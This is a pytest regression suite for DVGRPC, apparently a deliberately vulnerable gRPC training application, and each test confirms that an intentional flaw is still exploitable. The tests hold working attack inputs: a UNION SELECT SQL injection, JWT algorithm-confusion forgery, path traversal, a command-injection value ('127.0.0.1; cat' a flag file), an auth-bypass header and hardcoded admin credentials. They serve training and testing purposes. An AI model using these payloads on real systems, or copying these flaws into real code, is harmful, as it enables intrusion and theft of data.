"""
End-to-end regression tests for every DVGRPC challenge.

Each test proves the intentional vulnerability is still exploitable — if a
future refactor accidentally fixes one of these, CI fails, and someone has to
decide whether to update the challenge docs or restore the vuln.
"""

from __future__ import annotations

import pytest

pytestmark = pytest.mark.integration


# ----- Challenge 01 — Server reflection ------------------------------
def test_reflection_exposes_all_services(channel):
    from grpc_reflection.v1alpha.proto_reflection_descriptor_database import (
        ProtoReflectionDescriptorDatabase,
    )

    db = ProtoReflectionDescriptorDatabase(channel)
    services = db.get_services()
    expected = {
        "dvgrpc.AuthService",
        "dvgrpc.UserService",
        "dvgrpc.AdminService",
        "dvgrpc.ProductService",
        "dvgrpc.FileService",
        "dvgrpc.CommandService",
        "dvgrpc.CryptoService",
    }
    assert expected.issubset(set(services))


# ----- Challenge 02 — Unauthenticated admin --------------------------
def test_admin_get_flag_requires_no_auth(channel):
    from generated import admin_pb2, admin_pb2_grpc

    stub = admin_pb2_grpc.AdminServiceStub(channel)
    resp = stub.GetFlag(admin_pb2.GetFlagRequest(challenge="reflection"))
    assert resp.flag.startswith("FLAG{")


def test_admin_system_info_leaks_jwt_secret(channel):
    from generated import admin_pb2, admin_pb2_grpc

    stub = admin_pb2_grpc.AdminServiceStub(channel)
    resp = stub.GetSystemInfo(admin_pb2.GetSystemInfoRequest())
    assert resp.jwt_secret  # non-empty means leak regression


# ----- Challenge 03 — SQL injection ----------------------------------
def test_product_search_sql_injection(channel):
    from generated import product_pb2, product_pb2_grpc

    stub = product_pb2_grpc.ProductServiceStub(channel)
    # Classic UNION SELECT — pull data out of the flags table
    payload = "' UNION SELECT 9999, flag, hint, 0, challenge FROM flags --"
    resp = stub.SearchProducts(product_pb2.SearchRequest(query=payload))
    joined = " ".join(p.name + p.description for p in resp.products)
    assert "FLAG{" in joined


# ----- Challenge 04 — JWT algorithm confusion ------------------------
def test_jwt_algorithm_confusion(channel):
    import jwt as pyjwt

    from generated import auth_pb2, auth_pb2_grpc, user_pb2, user_pb2_grpc

    # 1. Fetch the public key
    auth = auth_pb2_grpc.AuthServiceStub(channel)
    pub = auth.GetPublicKey(auth_pb2.GetPublicKeyRequest()).public_key
    assert "BEGIN PUBLIC KEY" in pub

    # 2. Forge an HS256 token using the public key as the HMAC secret
    forged = pyjwt.encode(
        {"user_id": 1, "username": "admin", "role": "admin"},
        pub,
        algorithm="HS256",
    )

    # 3. Use it against an authenticated endpoint
    users = user_pb2_grpc.UserServiceStub(channel)
    resp = users.GetProfile(
        user_pb2.GetProfileRequest(user_id=1),
        metadata=(("authorization", f"Bearer {forged}"),),
    )
    assert resp.username == "admin"


# ----- Challenge 05 — IDOR -------------------------------------------
def test_idor_other_user_profile(channel):
    from generated import auth_pb2, auth_pb2_grpc, user_pb2, user_pb2_grpc

    auth = auth_pb2_grpc.AuthServiceStub(channel)
    tok = auth.Login(auth_pb2.LoginRequest(username="alice", password="alice123")).token

    users = user_pb2_grpc.UserServiceStub(channel)
    # Alice asking for admin's profile — IDOR.
    resp = users.GetProfile(
        user_pb2.GetProfileRequest(user_id=1),
        metadata=(("authorization", f"Bearer {tok}"),),
    )
    assert resp.username == "admin"


# ----- Challenge 06 — Path traversal ---------------------------------
def test_path_traversal_reads_secret_flag(channel):
    from generated import auth_pb2, auth_pb2_grpc, file_pb2, file_pb2_grpc

    auth = auth_pb2_grpc.AuthServiceStub(channel)
    tok = auth.Login(auth_pb2.LoginRequest(username="alice", password="alice123")).token

    files = file_pb2_grpc.FileServiceStub(channel)
    resp = files.ReadFile(
        file_pb2.ReadFileRequest(filename="../secret/path_flag.txt"),
        metadata=(("authorization", f"Bearer {tok}"),),
    )
    assert "FLAG{" in resp.content


# ----- Challenge 07 — Command injection ------------------------------
def test_command_injection_via_ping(channel, runtime_root):
    from generated import auth_pb2, auth_pb2_grpc, command_pb2, command_pb2_grpc

    auth = auth_pb2_grpc.AuthServiceStub(channel)
    tok = auth.Login(auth_pb2.LoginRequest(username="alice", password="alice123")).token

    cmd = command_pb2_grpc.CommandServiceStub(channel)
    # The `runtime_root` fixture owns where the server writes its flags,
    # so we cat that exact file — works in Docker, local, and pytest.
    flag_path = runtime_root / "secret" / "cmd_flag.txt"
    payload = f"127.0.0.1; cat {flag_path}"
    resp = cmd.Ping(
        command_pb2.PingRequest(host=payload, count=1),
        metadata=(("authorization", f"Bearer {tok}"),),
    )
    assert "FLAG{" in resp.output


# ----- Challenge 08 — Mass assignment --------------------------------
def test_mass_assignment_role_escalation(channel):
    import uuid

    from generated import auth_pb2, auth_pb2_grpc

    auth = auth_pb2_grpc.AuthServiceStub(channel)
    username = f"attacker_{uuid.uuid4().hex[:8]}"
    resp = auth.Register(
        auth_pb2.RegisterRequest(
            username=username,
            password="pw12345",
            email="e@x.local",
            role="admin",
        )
    )
    assert resp.success
    # Login and verify role
    tok = auth.Login(auth_pb2.LoginRequest(username=username, password="pw12345"))
    assert tok.role == "admin"


# ----- Challenge 09 — Metadata bypass --------------------------------
def test_metadata_bypass_header(channel):
    from generated import user_pb2, user_pb2_grpc

    users = user_pb2_grpc.UserServiceStub(channel)
    # No token — but the internal-service header bypasses auth entirely.
    resp = users.ListUsers(
        user_pb2.ListUsersRequest(),
        metadata=(("x-internal-service", "dvgrpc-internal-v1"),),
    )
    assert len(resp.users) > 0


# ----- Challenge 10 — Hardcoded credentials --------------------------
def test_hardcoded_admin_login(channel):
    from generated import auth_pb2, auth_pb2_grpc

    auth = auth_pb2_grpc.AuthServiceStub(channel)
    resp = auth.Login(auth_pb2.LoginRequest(username="admin", password="admin123"))
    assert resp.success and resp.role == "admin"


# ----- Challenge 13 — Integer overflow / unvalidated pagination ------
def test_paginated_search_negative_per_page_dumps_all(channel):
    from generated import product_pb2, product_pb2_grpc

    stub = product_pb2_grpc.ProductServiceStub(channel)
    normal = stub.PaginatedSearch(product_pb2.PaginatedSearchRequest(query="", page=0, per_page=5))
    all_rows = stub.PaginatedSearch(product_pb2.PaginatedSearchRequest(query="", page=0, per_page=-1))
    assert all_rows.total_returned > normal.total_returned
    joined = " ".join(p.description for p in all_rows.products)
    assert "FLAG{int3g3r_b0unds_n0t_v4l1d4t3d}" in joined


# ----- Bonus — ECB block repetition ----------------------------------
def test_ecb_mode_leaks_repeating_blocks(channel):
    from generated import crypto_pb2, crypto_pb2_grpc

    crypto = crypto_pb2_grpc.CryptoServiceStub(channel)
    # 32 bytes of identical plaintext → two identical 16-byte ciphertext blocks
    resp = crypto.Encrypt(crypto_pb2.EncryptRequest(plaintext="A" * 32, algorithm="AES-ECB"))
    ct = bytes.fromhex(resp.ciphertext_hex)
    assert ct[:16] == ct[16:32]
